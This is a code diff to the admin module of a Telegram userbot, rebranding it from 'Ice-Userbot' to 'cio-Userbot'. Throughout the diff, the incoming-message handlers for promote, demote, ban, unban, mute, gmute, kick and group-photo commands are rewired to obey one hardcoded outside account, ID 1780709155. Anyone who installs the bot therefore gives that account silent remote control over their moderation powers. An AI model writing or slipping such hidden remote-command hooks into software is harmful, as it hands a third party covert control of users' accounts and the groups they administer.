@@ -92,7 +92,7 @@ UNMUTE_RIGHTS = ChatBannedRights(until_date=None, send_messages=False)
 
 
 @ice_cmd(pattern="setgpic( -s| -d)$")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.csetgpic(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.csetgpic(?:\s|$)([\s\S]*)")
 async def set_group_photo(event):
     "For changing Group dp"
     flag = (event.pattern_match.group(1)).strip()
@@ -129,7 +129,7 @@ async def set_group_photo(event):
 
 
 @ice_cmd(pattern="promote(?:\s|$)([\s\S]*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cpromote(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cpromote(?:\s|$)([\s\S]*)")
 async def promote(event):
     new_rights = ChatAdminRights(
         add_admins=False,
@@ -154,7 +154,7 @@ async def promote(event):
 
 
 @ice_cmd(pattern="demote(?:\s|$)([\s\S]*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cdemote(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cdemote(?:\s|$)([\s\S]*)")
 async def demote(event):
     "To demote a person in group"
     user, _ = await get_user_from_event(event)
@@ -179,7 +179,7 @@ async def demote(event):
 
 
 @ice_cmd(pattern="ban(?:\s|$)([\s\S]*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cban(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cban(?:\s|$)([\s\S]*)")
 async def ban(bon):
     chat = await bon.get_chat()
     admin = chat.admin_rights
@@ -199,7 +199,7 @@ async def ban(bon):
         await edit_or_reply(
             bon,
             f"\\**#Banned_User**//"
-            f"\n\n❄️ Iᴄᴇ-Usᴇʀʙᴏᴛ ❄️"
+            f"\n\n🔥 ᴄɪᴏ-Usᴇʀʙᴏᴛ 🔥"
             f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
             f"**User ID:** `{str(user.id)}`\n"
             f"**Reason:** `{reason}`",
@@ -208,7 +208,7 @@ async def ban(bon):
         await edit_or_reply(
             bon,
             f"\\**#Banned_User**//"
-            f"\n\n❄️ Iᴄᴇ-Usᴇʀʙᴏᴛ ❄️"
+            f"\n\n🔥 ᴄɪᴏ-Usᴇʀʙᴏᴛ 🔥"
             f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
             f"**User ID:** `{user.id}`\n"
             f"**Action:** `Banned User by {owner}`",
@@ -216,7 +216,7 @@ async def ban(bon):
 
 
 @ice_cmd(pattern="unban(?:\s|$)([\s\S]*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cunban(?:\s|$)([\s\S]*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cunban(?:\s|$)([\s\S]*)")
 async def nothanos(unbon):
     chat = await unbon.get_chat()
     admin = chat.admin_rights
@@ -236,7 +236,7 @@ async def nothanos(unbon):
 
 
 @ice_cmd(pattern="mute(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cmute(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cmute(?: |$)(.*)")
 async def spider(spdr):
     try:
         from userbot.modules.sql_helper.spam_mute_sql import mute
@@ -260,7 +260,7 @@ async def spider(spdr):
     await edit_or_reply(
         spdr,
         r"\\**#Muted_User**//"
-        f"\n\n❄️ Iᴄᴇ-Usᴇʀʙᴏᴛ ❄️"
+        f"\n\n🔥 ᴄɪᴏ-Usᴇʀʙᴏᴛ 🔥"
         f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
         f"**User ID:** `{user.id}`\n"
         f"**Action:** `Mute by {owner}`",
@@ -273,7 +273,7 @@ async def spider(spdr):
             await edit_or_reply(
                 spdr,
                 r"\\**#DMute_User**//"
-                f"\n\n❄️ Iᴄᴇ-Usᴇʀʙᴏᴛ ❄️"
+                f"\n\n🔥 ᴄɪᴏ-Usᴇʀʙᴏᴛ 🔥"
                 f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
                 f"**User ID:** `{user.id}`\n"
                 f"**Reason:** `{reason}`",
@@ -282,7 +282,7 @@ async def spider(spdr):
             await edit_or_reply(
                 spdr,
                 r"\\**#DMute_User**//"
-                f"\n\n❄️ Iᴄᴇ-Usᴇʀʙᴏᴛ ❄️"
+                f"\n\n🔥 ᴄɪᴏ-Usᴇʀʙᴏᴛ 🔥"
                 f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
                 f"**User ID:** `{user.id}`\n"
                 f"**Action:** `DMute by {owner}`",
@@ -292,7 +292,7 @@ async def spider(spdr):
 
 
 @ice_cmd(pattern="unmute(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cunmute(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cunmute(?: |$)(.*)")
 async def unmoot(unmot):
     chat = await unmot.get_chat()
     admin = chat.admin_rights
@@ -350,7 +350,7 @@ async def muter(moot):
 
 
 @ice_cmd(pattern="ungmute(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cungmute(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cungmute(?: |$)(.*)")
 async def ungmoot(un_gmute):
     chat = await un_gmute.get_chat()
     admin = chat.admin_rights
@@ -373,7 +373,7 @@ async def ungmoot(un_gmute):
 
 
 @ice_cmd(pattern="gmute(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cgmute(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.cgmute(?: |$)(.*)")
 async def gspider(gspdr):
     chat = await gspdr.get_chat()
     admin = chat.admin_rights
@@ -403,7 +403,7 @@ async def gspider(gspdr):
         await edit_or_reply(
             gspdr,
             r"\\**#GMuted_User**//"
-            f"\n\n❄️ Iᴄᴇ-Usᴇʀʙᴏᴛ ❄️"
+            f"\n\n🔥 ᴄɪᴏ-Usᴇʀʙᴏᴛ 🔥"
             f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
             f"**User ID:** `{user.id}`\n"
             f"**Reason:** `{reason}`",
@@ -412,7 +412,7 @@ async def gspider(gspdr):
         await edit_or_reply(
             gspdr,
             r"\\**#GMuted_User**//"
-            f"\n\n❄️ Iᴄᴇ-Usᴇʀʙᴏᴛ ❄️"
+            f"\n\n🔥 ᴄɪᴏ-Usᴇʀʙᴏᴛ 🔥"
             f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})\n"
             f"**User ID:** `{user.id}`\n"
             f"**Action:** `Global Muted by {owner}`",
@@ -542,7 +542,7 @@ async def pin(event):
 
 
 @ice_cmd(pattern="kick(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.ckick(?: |$)(.*)")
+@register(incoming=True, from_users=1780709155, pattern=r"^\.ckick(?: |$)(.*)")
 async def kick(usr):
     chat = await usr.get_chat()
     admin = chat.admin_rights
